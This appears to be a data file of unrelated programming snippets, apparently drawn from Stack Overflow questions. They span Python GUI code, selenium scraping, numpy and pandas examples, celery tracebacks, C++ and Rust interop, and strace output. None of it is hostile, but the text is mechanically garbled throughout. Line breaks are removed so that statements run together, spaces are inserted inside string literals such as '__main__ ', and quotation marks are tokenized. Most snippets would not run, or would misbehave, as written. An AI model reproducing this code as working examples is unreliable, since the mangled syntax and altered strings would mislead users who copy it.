"# ! /usr/bin/env python3 # -*- coding : utf-8 -*-from tkinter import *import randomimport timeclass Application ( Frame ) : def __init__ ( self , master ) : `` '' '' Initialize the frame. `` '' '' super ( Application , self ) .__init__ ( master ) self.grid ( ) self.name_list = [ `` Thorin '' , '' Tyler '' , '' Jose '' , '' Bryson '' , '' Joe '' ] self.create_widget ( ) def create_widget ( self ) : self.lbl = Label ( self ) self.lbl [ `` text '' ] = `` Click to spin '' self.lbl [ `` font '' ] = ( `` Arial '' , 24 ) self.lbl.grid ( ) self.bttn = Button ( self ) self.bttn [ `` text '' ] = `` Spin '' self.bttn [ `` command '' ] = self.spin self.bttn.grid ( ) def spin ( self ) : if self.name_list : for i in range ( 5 ) : index = random.randrange ( len ( self.name_list ) ) self.lbl [ `` text '' ] = self.name_list [ index ] self.lbl.grid ( ) self.name_list.pop ( index ) else : self.lbl [ `` text '' ] = `` No more names '' self.lbl.grid ( ) def main ( ) : root = Tk ( ) root.title ( `` Click Counter '' ) root.geometry ( `` 600x600 '' ) app = Application ( root ) root.mainloop ( ) if __name__ == '__main__ ' : main ( )"
"from selenium import webdriverfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECchrome_options = webdriver.ChromeOptions ( ) chrome_options.add_argument ( ' -- headless ' ) chrome_options.add_argument ( ' -- no-sandbox ' ) chrome_options.add_argument ( ' -- disable-dev-shm-usage ' ) chrome_options.add_argument ( ' -- start-maximized ' ) webdriver = webdriver.Chrome ( 'chromedriver ' , chrome_options=chrome_options ) url = `` https : //www.cetelem.es/ '' webdriver.get ( url ) webdriver.find_element_by_class_name ( `` bar-slider importe '' ) .send_keys ( `` 20.000 '' ) webdriver.find_element_by_class_name ( `` bar-slider messes '' ) .send_keys ( `` 30 '' ) webdriver.save_screenshot ( 'sreenshot.png ' ) print ( webdriver.find_element_by_tag_name ( 'body ' ) .text )"
"class AbstractBase ( object ) : passclass Child ( AbstractBase ) : def __init__ ( self , cls1 , cls2 ) : assert isinstance ( cls1 , AbstractBase ) assert isinstance ( cls2 , AbstractBase ) # just to show they 're instances self.cls1 = cls1 self.cls2 = cls2 from pprint import pformatclass AbstractBase ( object ) : def __repr__ ( self ) : return self.__class__.__name__ + '\n ' \ + pformat ( { k : v for k , v in self.__dict__.iteritems ( ) if not '__ ' in k } ) MyClass { 'var1 ' : 1 , 'var2 ' : 2 } Child { 'cls1 ' : { 'var ' : 1 , } , 'cls2 ' : { 'var ' : 0 , } }"
if self.trait == self.spouse.trait : trait = self.traitelse : trait = defualtTrait trait = this.trait == this.spouse.trait ? this.trait : defualtTrait ;
myproj/__init__.pyMyProj.egg-info/ dependency_links.txt entry_points.txt PKG-INFO SOURCES.txt top_level.txt zip-safesetup.cfgsetup.py
"10:24:12.375456 futex ( 0x7f05e4d1072c , FUTEX_WAIT , 2 , NULL ) = 0 < 0.000823 > 10:24:12.377076 futex ( 0x7f05e4d1072c , FUTEX_WAIT , 2 , NULL ) = 0 < 0.002419 > 10:24:12.379588 futex ( 0x7f05e4d1072c , FUTEX_WAIT , 2 , NULL ) = 0 < 0.001898 > 10:24:12.382324 sched_yield ( ) = 0 < 0.000186 > 10:24:12.382596 futex ( 0x7f05e4d1072c , FUTEX_WAIT , 2 , NULL ) = 0 < 0.004023 > 10:24:12.387029 sched_yield ( ) = 0 < 0.000175 > 10:24:12.387279 futex ( 0x7f05e4d1072c , FUTEX_WAIT , 2 , NULL ) = 0 < 0.054431 > 10:24:12.442018 sched_yield ( ) = 0 < 0.000050 > 10:24:12.442157 futex ( 0x7f05e4d1072c , FUTEX_WAIT , 2 , NULL ) = 0 < 0.003902 > 10:24:12.446168 futex ( 0x7f05e4d1022c , FUTEX_WAKE , 1 ) = 1 < 0.000052 > 10:24:12.446316 futex ( 0x7f05e4d11cac , FUTEX_WAKE , 1 ) = 1 < 0.000056 > 10:24:12.446614 futex ( 0x7f05e4d1072c , FUTEX_WAIT , 2 , NULL ) = 0 < 1.439739 > 10:24:13.886513 futex ( 0x7f05e4d1072c , FUTEX_WAIT , 2 , NULL ) = 0 < 0.002381 > 10:24:13.889079 sched_yield ( ) = 0 < 0.000016 > 10:24:13.889135 sched_yield ( ) = 0 < 0.000049 > 10:24:13.889244 futex ( 0x7f05e4d1072c , FUTEX_WAIT , 2 , NULL ) = 0 < 0.032761 > 10:24:13.922147 sched_yield ( ) = 0 < 0.000020 > 10:24:13.922285 sched_yield ( ) = 0 < 0.000104 > 10:24:13.923628 futex ( 0x7f05e4d1072c , FUTEX_WAIT , 2 , NULL ) = 0 < 0.002320 > 10:24:13.926090 sched_yield ( ) = 0 < 0.000018 > 10:24:13.926244 futex ( 0x7f05e4d1072c , FUTEX_WAIT , 2 , NULL ) = 0 < 0.000265 > 10:24:13.926667 sched_yield ( ) = 0 < 0.000027 > 10:24:13.926775 sched_yield ( ) = 0 < 0.000042 > 10:24:13.926964 futex ( 0x7f05e4d1072c , FUTEX_WAIT , 2 , NULL ) = -1 EAGAIN ( Resource temporarily unavailable ) < 0.000117 > 10:24:13.927241 futex ( 0x7f05e4d110ac , FUTEX_WAKE , 1 ) = 1 < 0.000099 > 10:24:13.927455 futex ( 0x7f05e4d11d2c , FUTEX_WAKE , 1 ) = 1 < 0.000186 > 10:24:13.931318 futex ( 0x7f05e4d1072c , FUTEX_WAIT , 2 , NULL ) = 0 < 0.000678 >"
"# Currently > > > LDistance ( 'dog ' , 'god ' ) 2 # Sorted > > > LDistance ( 'dgo ' , 'dgo ' ) 0 # Proposed > > > newLDistance ( 'dog ' , 'god ' ) 0 # Currently > > > LDistance ( 'doge ' , 'gold ' ) 3 # Sorted > > > LDistance ( 'dego ' , 'dglo ' ) 2 # Proposed > > > newLDistance ( 'doge ' , 'gold ' ) 1 def mLD ( s , t ) : memo = { } def ld ( s , t ) : if not s : return len ( t ) if not t : return len ( s ) if s [ 0 ] == t [ 0 ] : return ld ( s [ 1 : ] , t [ 1 : ] ) if ( s , t ) not in memo : l1 = ld ( s , t [ 1 : ] ) l2 = ld ( s [ 1 : ] , t ) l3 = ld ( s [ 1 : ] , t [ 1 : ] ) memo [ ( s , t ) ] = 1 + min ( l1 , l2 , l3 ) return memo [ ( s , t ) ] return ld ( s , t )"
"from tensorflow.python.saved_model import loaderinput_tensor_key_feed_dict = { 'observations ' : np.array ( [ [ 23 ] ] ) , 'prev_action ' : np.array ( [ 0 ] ) , 'prev_reward ' : np.array ( [ 0 ] ) , 'is_training ' : False } config = tf.ConfigProto ( device_count= { 'GPU ' : 0 } ) with tf.device ( 'CPU:0 ' ) : with session.Session ( None , graph=ops_lib.Graph ( ) , config=config ) as sess : loader.load ( sess , tag_set.split ( ' , ' ) , saved_model_dir ) # error occurs here outputs = sess.run ( output_tensor_names_sorted , feed_dict=inputs_feed_dict ) for i , output in enumerate ( outputs ) : output_tensor_key = output_tensor_keys_sorted [ i ] print ( 'Result for output key % s : \t % s ' % ( output_tensor_key , output ) )"
Index STNAME COUNTY COUNTY_POP 0 AL 0 100 1 AL 1 150 2 AL 3 200 3 AL 5 50 ... 15 CA 0 300 16 CA 1 200 17 CA 3 250 18 CA 4 350 In [ ] : df.groupby ( [ 'STNAME ' ] ) [ 'COUNTY_POP ' ] .nlargest ( 3 ) Out [ ] : Index STNAME COUNTY COUNTY_POP 0 AL 0 100 1 AL 1 150 2 AL 3 200 ... 15 CA 0 300 17 CA 3 250 18 CA 4 350 In [ ] : df.groupby ( [ 'STNAME ' ] ) [ 'COUNTY_POP ' ] .nlargest ( 3 ) .sum ( ) Out [ ] : 1350
MOCK_MODULES = [ 'wx.lib.newevent ' ] # I 've skipped irrelevant entries ... for module_name in MOCK_MODULES : sys.modules [ module_name ] = mock.Mock ( )
"myVar = [ `` jhhj '' , `` hgc '' ] myTuple = ( [ 1,2,3 ] , [ 4,5,6 ] , myVar ) myVar.append ( 'lololol ' ) print myTuple myVar = `` lol '' myTuple = ( [ 1,2,3 ] , [ 4,5,6 ] , myVar ) myVar = `` lolol '' print myTuple"
./runtests.py -- settings=test_sqlite i18n.URLRedirectWithoutTrailingSlashTests
"def add_tasks ( celery ) : for new_task in settings.NEW_TASKS : celery.add_periodic_task ( new_task [ 'interval ' ] , my_task.s ( new_task [ 'uuid ' ] ) , name='My Task % s ' % new_task [ 'uuid ' ] , ) app = Celery ( 'my_app ' ) @ app.on_after_configure.connectdef setup_periodic_tasks ( celery , **kwargs ) : from add_tasks_module import add_tasks add_tasks ( celery ) Traceback ( most recent call last ) : File `` /usr/local/lib/python3.6/site-packages/kombu/utils/objects.py '' , line 42 , in __get__ return obj.__dict__ [ self.__name__ ] KeyError : 'tasks'During handling of the above exception , another exception occurred : Traceback ( most recent call last ) : File `` /usr/local/lib/python3.6/site-packages/kombu/utils/objects.py '' , line 42 , in __get__ return obj.__dict__ [ self.__name__ ] KeyError : 'data'During handling of the above exception , another exception occurred : Traceback ( most recent call last ) : File `` /usr/local/lib/python3.6/site-packages/kombu/utils/objects.py '' , line 42 , in __get__ return obj.__dict__ [ self.__name__ ] KeyError : 'tasks'During handling of the above exception , another exception occurred : Traceback ( most recent call last ) : ( SHORTENED HERE . Just contained the trace from the console through my call to this function ) File `` /opt/my_app/add_tasks_module/__init__.py '' , line 42 , in add_tasks my_task.s ( new_task [ 'uuid ' ] ) , File `` /usr/local/lib/python3.6/site-packages/celery/local.py '' , line 146 , in __getattr__ return getattr ( self._get_current_object ( ) , name ) File `` /usr/local/lib/python3.6/site-packages/celery/local.py '' , line 109 , in _get_current_object return loc ( *self.__args , **self.__kwargs ) File `` /usr/local/lib/python3.6/site-packages/celery/app/__init__.py '' , line 72 , in task_by_cons return app.tasks [ File `` /usr/local/lib/python3.6/site-packages/kombu/utils/objects.py '' , line 44 , in __get__ value = obj.__dict__ [ self.__name__ ] = self.__get ( obj ) File `` /usr/local/lib/python3.6/site-packages/celery/app/base.py '' , line 1228 , in tasks self.finalize ( auto=True ) File `` /usr/local/lib/python3.6/site-packages/celery/app/base.py '' , line 507 , in finalize with self._finalize_mutex : import osfrom celery import Celeryfrom django.conf import settingsfrom myapp.tasks import my_task # set the default Django settings module for the 'celery ' program.os.environ.setdefault ( 'DJANGO_SETTINGS_MODULE ' , 'my_app.settings ' ) app = Celery ( 'my_app ' ) @ app.on_after_configure.connectdef setup_periodic_tasks ( sender , **kwargs ) : sender.add_periodic_task ( 60 , my_task.s ( ) , name='Testtask ' ) app.config_from_object ( 'django.conf : settings ' , namespace='CELERY ' ) app.autodiscover_tasks ( lambda : settings.INSTALLED_APPS ) from celery import shared_task @ shared_task ( ) def my_task ( ) : print ( 'ran ' ) ./manage.py shell -c 'from myapp.tasks import my_task ; my_task.delay ( ) '"
"( ( 1 , ( 2 , 3 ) ) , ( 4 , 5 ) ) ( ( 5 , 4 ) , ( ( 3 , 2 ) , 1 ) ) def mirror ( t ) : n = 1 for i in t : if isinstance ( i , tuple ) : mirror ( i ) if n == len ( t ) : t = list ( t ) t = t [ : :-1 ] t = tuple ( t ) n += 1 return t"
"In [ 177 ] : a = np.array ( [ [ 0,0,3 ] , [ 4,5,6 ] , [ 7,0,0 ] , [ 10,11,12 ] , [ 13,14,15 ] ] ) b = np.zeros_like ( a ) aOut [ 177 ] : array ( [ [ 0 , 0 , 3 ] , [ 4 , 5 , 6 ] , [ 7 , 0 , 0 ] , [ 10 , 11 , 12 ] , [ 13 , 14 , 15 ] ] ) In [ 178 ] : # select all rows containg note more than 50 % 0 valuespercent = np.sum ( a == 0 , axis=-1 ) / float ( check.shape [ 1 ] ) percent = percent > = 0.5slice = np.invert ( percent ) .nonzero ( ) [ 0 ] In [ 183 ] : # select first two rows satisfying 'slice ' a [ slice ] [ 0:2 ] Out [ 183 ] : array ( [ [ 4 , 5 , 6 ] , [ 10 , 11 , 12 ] ] ) In [ 182 ] : # do something and place modified rows on same index of zero arrayb [ slice ] [ 0:2 ] = a [ slice ] [ 0:2 ] * 2In [ 184 ] : bOut [ 184 ] : array ( [ [ 0 , 0 , 0 ] , [ 0 , 0 , 0 ] , [ 0 , 0 , 0 ] , [ 0 , 0 , 0 ] , [ 0 , 0 , 0 ] ] )"
"a = [ b1 , x , b3 , y , b2 ] - > [ b1 , x , b2 , y , b3 ] a = [ b1 , x , b2 , y , b3 ] - > no changea = [ b1 , x , y , b2 ] - > no changea = [ b3 , x , b1 , y , b2 ] - > [ b1 , x , b2 , y , b3 ] bslots = dict ( ( x , a.index ( x ) ) for x in a if x in b ) bslotsSorted = sorted ( bslots.keys ( ) , key=lambda y : b.index ( y ) ) indexes = sorted ( bslots.values ( ) ) for x , y in zip ( bslotsSorted , indexes ) : a [ y ] = x"
"# include < cstdlib > # include < iostream > # include < string > # include < algorithm > # include < vector > using namespace std ; int main ( int argc , char** argv ) { int nScenarios , areaWidth , areaHeight , patternWidth , patternHeight ; cin > > nScenarios ; for ( int a = 0 ; a < nScenarios ; a++ ) { //get the pattern info and make a vector cin > > patternHeight > > patternWidth ; vector < vector < bool > > patternIsBuilding ( patternHeight , vector < bool > ( patternWidth , false ) ) ; //populate data for ( int i = 0 ; i < patternHeight ; i++ ) { string temp ; cin > > temp ; for ( int j = 0 ; j < patternWidth ; j++ ) { patternIsBuilding.at ( i ) .at ( j ) = ( temp [ j ] == ' X ' ) ; } } //get the area info and make a vector cin > > areaHeight > > areaWidth ; vector < vector < bool > > areaIsBuilding ( areaHeight , vector < bool > ( areaWidth , false ) ) ; //populate data for ( int i = 0 ; i < areaHeight ; i++ ) { string temp ; cin > > temp ; for ( int j = 0 ; j < areaWidth ; j++ ) { areaIsBuilding.at ( i ) .at ( j ) = ( temp [ j ] == ' X ' ) ; } } //now the vectors contain a ` true ` for a building and a ` false ` for snow //need to find the matches for patternIsBuilding inside areaIsBuilding //how ? } return 0 ; } # function to read a matrix from stdindef read_matrix ( ) : # get the width and height for this matrix nrows , ncols = map ( int , raw_input ( ) .split ( ) ) # get the matrix from input matrix = [ raw_input ( ) for _ in xrange ( nrows ) ] # make sure that it all matches up assert all ( len ( row ) == ncols for row in matrix ) # return the matrix return matrix # perform the check , given the pattern and area mapdef count_pattern ( pattern , area ) : # get the number of rows , and the number of columns in the first row ( cause it 's the same for all of them ) nrows = len ( pattern ) ncols = len ( pattern [ 0 ] ) # how does this work ? return sum ( pattern == [ row [ j : j + ncols ] for row in area [ i : i + nrows ] ] for i in xrange ( len ( area ) - nrows + 1 ) for j in xrange ( len ( area [ i ] ) - ncols + 1 ) ) # get a number of scenarios , and that many times , operate on the two inputted matrices , pattern and areafor _ in xrange ( int ( raw_input ( ) ) ) : print count_pattern ( read_matrix ( ) , read_matrix ( ) )"
"# [ no_mangle ] pub extern fn my_func ( x : i32 , y : i32 ) - > i32 { return x + y ; } In [ 1 ] : from ctypes import cdllIn [ 2 ] : lib = cdll.LoadLibrary ( `` /home/user/RustStuff/embed/target/release/libembed.so '' ) In [ 3 ] : lib.my_func ( 5,6 ) Out [ 3 ] : 11 # [ no_mangle ] pub extern fn my_func ( my_vec : Vec < i32 > ) - > i32 { let mut my_sum = 0 ; for i in my_vec { my_sum += i ; } return my_sum ; } In [ 1 ] : from ctypes import cdllIn [ 2 ] : lib = cdll.LoadLibrary ( `` /home/user/RustStuff/embed/target/release/libembed.so '' ) In [ 3 ] : lib.my_func ( [ 2,3,4 ] ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -ArgumentError Traceback ( most recent call last ) < ipython-input-3-454ffc5ba9dd > in < module > ( ) -- -- > 1 lib.my_func ( [ 2,3,4 ] ) ArgumentError : argument 1 : < type 'exceptions.TypeError ' > : Do n't know how to convert parameter 1"
some text.. image : : http : //example.com/image.png : alt : Alt text ERROR : Better Fig . Error : image not found : /Users/kendriu/sources/pelican-blog/contenthttp : /example.com/image.pngERROR : Could not process ./4_joe.rst | [ Errno 2 ] No such file or directory : u'/Users/kendriu/sources/pelican-blog/contenthttp : /example.com/image.png '
"pip freeze lxml==2.1.2mod-python==3.3.1Numeric==24.2numpy==1.3.0pycrypto==2.6pywbem==0.7.0PyXML==0.8.4 python bootstrap.py -- allow-site-packagesbin/buildout [ buildout ] newest = falseextensions = gp.vcsdevelopdevelop-dir = srcparts = eggs tests wsgiinclude-site-packages = trueallowed-eggs-from-site-packages = pycryptoeggs = Django==1.4.8 ordereddict ipython==0.13.2 django-webtest django-grappelli < 2.5.0 django-bootstrap3-datetimepicker z3c.recipe.usercrontab rrdgraphs south achilterm pynag pyaml < 14 DjangoDevKit==1.0.3 Sphinx xlwt xlrd spur ... # bin/buildoutUnused options for buildout : 'allowed-eggs-from-site-packages ' 'include-site-packages'.Installing eggs.Getting distribution for 'pycrypto ! =2.4 , > =2.1'.configure : error : in ` /tmp/easy_install-QFXca_/pycrypto-2.6.1 ' : configure : error : no acceptable C compiler found in $ PATHSee ` config.log ' for more detailsTraceback ( most recent call last ) : File `` < string > '' , line 1 , in < module > File `` build/bdist.linux-x86_64/egg/setuptools/command/easy_install.py '' , line 2254 , in main File `` /usr/lib64/python2.6/distutils/core.py '' , line 152 , in setup dist.run_commands ( ) File `` /usr/lib64/python2.6/distutils/dist.py '' , line 975 , in run_commands self.run_command ( cmd ) File `` /usr/lib64/python2.6/distutils/dist.py '' , line 995 , in run_command cmd_obj.run ( ) File `` build/bdist.linux-x86_64/egg/setuptools/command/easy_install.py '' , line 380 , in run File `` build/bdist.linux-x86_64/egg/setuptools/command/easy_install.py '' , line 610 , in easy_install File `` build/bdist.linux-x86_64/egg/setuptools/command/easy_install.py '' , line 659 , in install_item File `` build/bdist.linux-x86_64/egg/setuptools/command/easy_install.py '' , line 842 , in install_eggs File `` build/bdist.linux-x86_64/egg/setuptools/command/easy_install.py '' , line 1070 , in build_and_install File `` build/bdist.linux-x86_64/egg/setuptools/command/easy_install.py '' , line 1056 , in run_setup File `` build/bdist.linux-x86_64/egg/setuptools/sandbox.py '' , line 240 , in run_setup File `` /usr/lib64/python2.6/contextlib.py '' , line 34 , in __exit__ self.gen.throw ( type , value , traceback ) File `` build/bdist.linux-x86_64/egg/setuptools/sandbox.py '' , line 193 , in setup_context File `` /usr/lib64/python2.6/contextlib.py '' , line 34 , in __exit__ self.gen.throw ( type , value , traceback ) File `` build/bdist.linux-x86_64/egg/setuptools/sandbox.py '' , line 164 , in save_modules File `` build/bdist.linux-x86_64/egg/setuptools/sandbox.py '' , line 139 , in resume File `` build/bdist.linux-x86_64/egg/setuptools/sandbox.py '' , line 152 , in save_modules File `` build/bdist.linux-x86_64/egg/setuptools/sandbox.py '' , line 193 , in setup_context File `` build/bdist.linux-x86_64/egg/setuptools/sandbox.py '' , line 237 , in run_setup File `` build/bdist.linux-x86_64/egg/setuptools/sandbox.py '' , line 267 , in run File `` build/bdist.linux-x86_64/egg/setuptools/sandbox.py '' , line 236 , in runner File `` build/bdist.linux-x86_64/egg/setuptools/sandbox.py '' , line 46 , in _execfile File `` /tmp/easy_install-QFXca_/pycrypto-2.6.1/setup.py '' , line 456 , in < module > File `` /usr/lib64/python2.6/distutils/core.py '' , line 152 , in setup dist.run_commands ( ) File `` /usr/lib64/python2.6/distutils/dist.py '' , line 975 , in run_commands self.run_command ( cmd ) File `` /usr/lib64/python2.6/distutils/dist.py '' , line 995 , in run_command cmd_obj.run ( ) File `` build/bdist.linux-x86_64/egg/setuptools/command/bdist_egg.py '' , line 160 , in run File `` build/bdist.linux-x86_64/egg/setuptools/command/bdist_egg.py '' , line 146 , in call_command File `` /usr/lib64/python2.6/distutils/cmd.py '' , line 333 , in run_command self.distribution.run_command ( command ) File `` /usr/lib64/python2.6/distutils/dist.py '' , line 995 , in run_command cmd_obj.run ( ) File `` build/bdist.linux-x86_64/egg/setuptools/command/install_lib.py '' , line 10 , in run File `` /usr/lib64/python2.6/distutils/command/install_lib.py '' , line 112 , in build self.run_command ( 'build_ext ' ) File `` /usr/lib64/python2.6/distutils/cmd.py '' , line 333 , in run_command self.distribution.run_command ( command ) File `` /usr/lib64/python2.6/distutils/dist.py '' , line 995 , in run_command cmd_obj.run ( ) File `` /tmp/easy_install-QFXca_/pycrypto-2.6.1/setup.py '' , line 251 , in run File `` /usr/lib64/python2.6/distutils/cmd.py '' , line 333 , in run_command self.distribution.run_command ( command ) File `` /usr/lib64/python2.6/distutils/dist.py '' , line 995 , in run_command cmd_obj.run ( ) File `` /tmp/easy_install-QFXca_/pycrypto-2.6.1/setup.py '' , line 278 , in runRuntimeError : autoconf errorAn error occurred when trying to install pycrypto 2.6.1 . Look above this message for any errors that were output by easy_install.While : Installing eggs . Getting distribution for 'pycrypto ! =2.4 , > =2.1'.Error : Could n't install : pycrypto 2.6.1"
"import numpy as npbins = np.array ( [ 9.95,19.95,79.95 ] ) x = np.array ( [ 6.68 , 9.20 , 12.5 , 18.75 , 21.59 ] ) y = np.take ( bins , np.digitize ( x , bins ) ) In [ 10 ] : yOut [ 10 ] : array ( [ 9.95 , 9.95 , 19.95 , 19.95 , 79.95 ] )"
"from numpy import *a = matrix ( ' 1 4 1 ; 4 13 7 ; 7 22 13 ' ) b = matrix ( ' 0 ; 0 ; 1 ' ) print linalg.solve ( a , b ) [ [ 3.46430741e+15 ] [ -6.92861481e+14 ] [ -6.92861481e+14 ] ]"
"from aiohttp import web shared_item = 'bla'async def handle ( request ) : if items [ 'test ' ] == 'val ' : shared_item = 'doeda ' print ( shared_item ) app = web.Application ( ) app.router.add_get ( '/ ' , handle ) web.run_app ( app , host='somewhere.com ' , port=8181 )"
"list_of_tuples = [ ( u'Wa ' , 1 ) , ( u'Vb',2 ) , ( u'Wc',3 ) , ( u'Vd',4 ) , ( u'Öa',5 ) , ( u'äa',6 ) , ( u'Åa',7 ) ] print ' # # # # # # # # # # Ordering One # # # # # # # # # # # # # # 'ordered_list_one = sorted ( list_of_tuples , key=lambda t : tuple ( t [ 0 ] .lower ( ) ) ) for item in ordered_list_one : print item [ 0 ] print ' # # # # # # # # # # Ordering Two # # # # # # # # # # # # # # 'locale.setlocale ( locale.LC_ALL , `` sv_SE.utf8 '' ) list_of_names = [ u'Wa ' , u'Vb ' , u'Wc ' , u'Vd ' , u'Öa ' , u'äa ' , u'Åa ' ] ordered_list_two = sorted ( list_of_names , cmp=locale.strcoll ) for item in ordered_list_two : print item # # # # # # # # # # Ordering One # # # # # # # # # # # # # # VbVdWaWcäaÅaÖa # # # # # # # # # # Ordering Two # # # # # # # # # # # # # # WaVbWcVdÅaäaÖa"
"@ fooclass Bar ( object ) : def __init__ ( self , x ) : self.x = x def spam ( self ) : statements"
"class mytup ( object ) : def __init__ ( self , a ) : self.tup = tuple ( a ) def __getattr__ ( self , nm ) : f = types.MethodType ( lambda self : getattr ( self.tup , nm ) ( ) , self , type ( self ) ) f.__func__.func_name = nm setattr ( self , nm , f ) return f mt = mytup ( range ( 10 ) ) In [ 253 ] : len ( mt ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -TypeError Traceback ( most recent call last ) < ipython-input-253-67688b907b8a > in < module > ( ) -- -- > 1 len ( mt ) TypeError : object of type 'mytup ' has no len ( ) In [ 254 ] : mt.__len__Out [ 254 ] : < bound method mytup.__len__ of < __main__.mytup object at 0x2e85150 > > In [ 255 ] : mt.__len__ ( ) Out [ 255 ] : 10 def __len__ ( self , *a ) : return self.tup.__len__ ( *a )"
"def build_mlp ( input_var=None ) : # This creates an MLP of two hidden layers of 800 units each , followed by # a softmax output layer of 10 units . It applies 20 % dropout to the input # data and 50 % dropout to the hidden layers . # Input layer , specifying the expected input shape of the network # ( unspecified batchsize , 1 channel , 28 rows and 28 columns ) and # linking it to the given Theano variable ` input_var ` , if any : l_in = lasagne.layers.InputLayer ( shape= ( None , 60 ) , input_var=input_var ) # Apply 20 % dropout to the input data : l_in_drop = lasagne.layers.DropoutLayer ( l_in , p=0.2 ) # Add a fully-connected layer of 800 units , using the linear rectifier , and # initializing weights with Glorot 's scheme ( which is the default anyway ) : l_hid1 = lasagne.layers.DenseLayer ( l_in_drop , num_units=800 , nonlinearity=lasagne.nonlinearities.rectify , W=lasagne.init.Uniform ( ) ) # We 'll now add dropout of 50 % : l_hid1_drop = lasagne.layers.DropoutLayer ( l_hid1 , p=0.5 ) # Another 800-unit layer : l_hid2 = lasagne.layers.DenseLayer ( l_hid1_drop , num_units=800 , nonlinearity=lasagne.nonlinearities.rectify ) # 50 % dropout again : l_hid2_drop = lasagne.layers.DropoutLayer ( l_hid2 , p=0.5 ) # Finally , we 'll add the fully-connected output layer , of 10 softmax units : l_out = lasagne.layers.DenseLayer ( l_hid2_drop , num_units=2 , nonlinearity=lasagne.nonlinearities.softmax ) # Each layer is linked to its incoming layer ( s ) , so we only need to pass # the output layer to give access to a network in Lasagne : return l_out"
"import numpy.random as randimport timex = rand.normal ( size= ( 300,50000 ) ) y = rand.normal ( size= ( 300,50000 ) ) for i in range ( 1000 ) : t0 = time.time ( ) y *= x print `` % .4f '' % ( time.time ( ) -t0 ) y /= y.max ( ) # to prevent overflows"
"np.set_printoptions ( threshold=np.NaN , precision=3 , suppress=True , linewidth=180 )"
db : host : ' x.x.x.x.x ' main : password : 'password_main ' admin : password : 'password_admin ' sed -i `` /^\ ( [ [ : space : ] ] *host : \ ) . */s//\1 ' $ DNS_ENDPOINT'/ '' config.yml sed -i `` /^\ ( [ [ : space : ] ] *main : \n* [ [ : space : ] ] *password : \ ) . */s//\1 ' $ DNS_ENDPOINT'/ '' config.yml
"deq = collections.deque ( [ 1 , 2 , 3 ] ) del deq [ 1 ]"
"import numpy as npimport pandas as pdCOUNT = 1000000df = pd.DataFrame ( { ' y ' : np.random.normal ( 0 , 1 , COUNT ) , ' z ' : np.random.gamma ( 50 , 1 , COUNT ) , } ) % timeit df.y [ ( 10 < df.z ) & ( df.z < 50 ) ] .mean ( ) % timeit df.y.values [ ( 10 < df.z.values ) & ( df.z.values < 50 ) ] .mean ( ) % timeit df.eval ( ' y [ ( 10 < z ) & ( z < 50 ) ] .mean ( ) ' , engine='numexpr ' ) 17.8 ms ± 1.3 ms per loop ( mean ± std . dev . of 7 runs , 100 loops each ) 8.44 ms ± 502 µs per loop ( mean ± std . dev . of 7 runs , 100 loops each ) 46.4 ms ± 2.22 ms per loop ( mean ± std . dev . of 7 runs , 10 loops each )"
"with open ( 'filename ' , ' r ' ) as f : x = dosomething ( f ) f = open ( 'filename ' , ' r ' ) x = dosomething ( f ) f.close ( ) x = dosomething ( open ( 'filename ' , ' r ' ) )"
"import numpy as npa = np.array ( [ np.nan ] , dtype=float ) b = np.array ( [ np.nan ] , dtype=float ) print a == ba = np.array ( [ np.nan ] , dtype=object ) b = np.array ( [ np.nan ] , dtype=object ) print a == b [ False ] [ True ]"
"# ! /usr/bin/pythonfrom __future__ import divisionimport itertoolsimport operatorimport mathn=14m=n+1def innerproduct ( A , B ) : assert ( len ( A ) == len ( B ) ) s = 0 for k in xrange ( 0 , n ) : s+=A [ k ] *B [ k ] return sleadingzerocounts = [ 0 ] *mfor S in itertools.product ( [ -1,1 ] , repeat = n ) : S1 = S + S for F in itertools.product ( [ -1,1 ] , repeat = n ) : i = 0 while ( i < m ) : ip = innerproduct ( F , S1 [ i : i+n ] ) if ( ip == 0 ) : leadingzerocounts [ i ] +=1 i+=1 else : breakprint leadingzerocounts [ 56229888 , 23557248 , 9903104 , 4160640 , 1758240 , 755392 , 344800 , 172320 , 101312 , 75776 , 65696 , 61216 , 59200 , 59200 , 59200 ]"
"> > > random.seed ( 1 ) > > > [ random.randint ( 0,10 ) for _ in range ( 0,10 ) ] [ 2 , 9 , 1 , 4 , 1 , 7 , 7 , 7 , 10 , 6 ] > > > random.seed ( 1 ) > > > random.random ( ) 0.13436424411240122 > > > [ random.randint ( 0,10 ) for _ in range ( 0,10 ) ] [ 1 , 4 , 1 , 7 , 7 , 7 , 10 , 6 , 3 , 1 ]"
"a = Counter ( { 1 : 23 , 2 : 39 , 3 : 1 } ) b = Counter ( { 1 : 28 , 2 : 39 , 3 : 1 } ) c = Counter ( { 1 : 23 , 2 : 39 , 3 : 2 } ) d = Counter ( { 1 : 23 , 2 : 22 , 3 : 1 } ) each_key_val = { } for i in a.keys ( ) : # The assumption here is that all Counters must share the same keys for j in [ a , b , c , d ] : try : each_key_val [ i ] .append ( j [ i ] ) except : each_key_val [ i ] = [ j [ i ] ] np.mean ( each_key_val [ i ] ) np.var ( each_key_val [ i ] )"
"from command import Commandimport sysclass MyCommand ( Command ) : @ Command.subcommand def foo ( self ) : print `` this can be run as a subcommand '' def bar ( self ) : print `` but this is a plain method and is n't exposed to the CLI '' MyCommand ( ) ( *sys.argv ) # at the command line , the user runs `` mycommand.py foo '' class Command ( object ) : @ staticmethod def subcommand ( method ) : method.is_subcommand = True return method @ subcommand def common ( self ) : print `` this subcommand is available to all child classes '' def subcommand ( method ) : method.is_subcommand = True return methodclass Command ( object ) : @ subcommand def common ( self ) : print `` this subcommand is available to all child classes '' Command.subcommand = staticmethod ( subcommand ) del subcommand"
